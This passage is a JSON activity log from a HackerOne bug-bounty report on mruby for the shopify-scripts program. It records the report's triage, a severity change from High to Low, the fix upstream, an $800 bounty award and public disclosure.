https://github.com/mruby/mruby/issues/3382","automated_response":false,"created_at":"2017-01-09T13:42:46.156Z","updated_at":"2017-01-09T13:42:46.156Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1408412,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2017-01-09T13:43:44.229Z","updated_at":"2017-01-09T13:43:44.229Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1408414,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2017-01-09T13:43:51.141Z","updated_at":"2017-01-09T13:43:51.141Z","additional_data":{"old_severity":"High (7.4)","new_severity":"Low","old_severity_id":14917,"new_severity_id":18296},"actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1440931,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks again for your report. This issue has been addressed upstream in https://github.com/mruby/mruby/commit/b3ce364537cf1f745112d6e5acd71f009dcd872f\n\nOur next round of bounty decisions will take place within two weeks, so we'll be in touch with you again soon.","automated_response":false,"created_at":"2017-01-24T14:13:30.208Z","updated_at":"2017-01-24T14:13:30.208Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"mg36","url":"/mg36"},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1467344,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of Mruby and Shopify Scripts!","automated_response":false,"created_at":"2017-02-07T01:25:29.881Z","updated_at":"2017-02-07T01:25:29.881Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"shopify-scripts"}},"bounty_amount":"800.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify-scripts","collaborator":{"username":"mg36","url":"/mg36"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1467345,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-02-07T01:25:35.561Z","updated_at":"2017-02-07T01:25:35.561Z","first_to_agree":true,"actor":{"username":"andrewdunbar","cleared":false,"url":"/andrewdunbar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/164/5b0e89675ed6dbb9df87223e9f8f58e2125bb56b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1528908,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-03-09T01:25:49.641Z","updated_at":"2017-03-09T01:25:49.641Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"shopify-scripts"}},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}